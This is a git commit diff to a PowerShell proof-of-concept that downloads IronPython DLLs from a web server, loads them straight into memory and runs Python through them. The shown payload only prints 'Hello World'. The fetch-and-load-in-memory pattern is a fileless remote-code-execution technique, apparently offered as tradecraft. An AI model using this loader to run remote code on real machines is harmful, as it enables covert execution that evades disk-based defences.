22aef3b402756a415d51b8f16c938a1665273df2
elitest <dcypherd@gmail.com>
2018-02-21 13:25:13 -0600

    Update to remove assembly resolve

--- PowerShell/PoC/dotnetoverdotnet.poc.ps1
+++ PowerShell/PoC/dotnetoverdotnet.poc.ps1
@@ -1,18 +1,7 @@
-#Set up the AssemblyResolve handler
-$R=[System.ResolveEventHandler] {
-    param($s,$e)
-    #Make sure you load the DLLs into a webserver of your choice and change the URL
-    $d = (New-Object Net.WebClient).DownloadData("http://localhost:8888/"+$e.Name)
-    #This actually does the loading, when the assembly is not found
-    return [Reflection.Assembly]::Load($d)}
-#Initiate the handler
-[AppDomain]::CurrentDomain.add_AssemblyResolve($R)
-#Attembpt to load the DLLs
-[Reflection.Assembly]::Load("IronPython.dll")|Out-Null
-[Reflection.Assembly]::Load("IronPython.Modules.dll")|Out-Null
-[Reflection.Assembly]::Load("Microsoft.Scripting.dll")|Out-Null
-[Reflection.Assembly]::Load("Microsoft.Dynamic.dll")|Out-Null
-#Now that IronPython is in memory, lets execute some Python
+#Load the assemblies
+[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://localhost:8888/IronPython.dll"))|Out-Null
+[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://localhost:8888/IronPython.Modules.dll"))|Out-Null
+[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://localhost:8888/Microsoft.Scripting.dll"))|Out-Null
+[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://localhost:8888/Microsoft.Dynamic.dll"))|Out-Null
+#Run some IronPython Code
 [ironpython.hosting.python]::CreateEngine().Execute("print 'Hello World From IronPython'")
-#Good idea to tear down the handler, or you end up with buffer overflows
-[AppDomain]::CurrentDomain.remove_AssemblyResolve($R)
